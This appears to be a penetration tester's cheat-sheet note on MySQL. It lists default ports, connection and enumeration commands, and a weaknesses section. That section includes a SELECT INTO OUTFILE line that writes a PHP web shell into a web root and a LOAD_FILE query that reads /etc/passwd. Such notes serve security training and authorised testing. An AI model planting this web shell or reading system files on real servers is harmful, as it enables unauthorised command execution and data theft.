---
type: knowledge
category: protocols
tags:
  - knowledge/protocol
aliases:
  - mysql, mariaDB, 3306, 33060
---
# MySQL (My Structured Query Language)

**Default Ports:** `3306` (TCP - Standard MySQL)  |  `33060` (TCP -MySQL X Protocol / Document Store)  
**Description:** Relational Database Management System (RDBMS). By default, MySQL often listens only on `127.0.0.1` (localhost). If port 3306 is accessible from outside the network, this is often due 

---


## 01 - Enumeration

### 1.1 - Quick Check / Banner Grabbing

### 1.2 - Deep Enumeration

## 02 - Connecting to Service
### 2.1 - Establishing connection:

Connect to MySQL server with username and password:
```bash
mysql -u <user> -p<password> -h <IP address> -P PORT --skip-ssl 
```

Connect as Root (e.g. MariaDB after Privilege Escalation):
```bash
mysql -u root
```
### 2.2 - MySQL command sequence after establishing a connection:
1. Show all databases:
```sql
show databases;
```

2. Select DB:
```sql
use <database>;
```

3. Show all available tables of selected DB:
```sql
show tables;
```

4. Show all columns in selected table:
```sql
show columns from <table>;
```

5. Show everything in the desired table:
```sql
select * from <table>;
```
Saves the output in the desired file (localy):
```bash
tee output.txt;
```

6. Search for needed string in desired table:
```sql
select * from <table> where <column> = "<string>";
```
It is also possible to filter for cells containing certain values:
```sql
SELECT * FROM <table> WHERE <column> LIKE 'pass%';
```

7. Filter for records `WHERE` employee number is greater than 10000 `OR` their tile does `NOT` contain 'engineer':
```sql
SELECT * FROM titles WHERE emp_no > 10000 OR title != 'engineer';
```

---

## Weaknesses
![[Hydra#Bruteforcing MySQL]]
### Upload Payload to Server
`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose `MySQL` operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory. Then we can browse to the location where the file is and execute our commands:
```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.

`secure_file_priv` may be set as follows:

- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

In the following example, we can see the `secure_file_priv` variable is empty, which means we can read and write data using `MySQL`:
```sql
show variables like "secure_file_priv";
```

### Read local files
By default a `MySQL` installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:
```sql
select LOAD_FILE("/etc/passwd");
```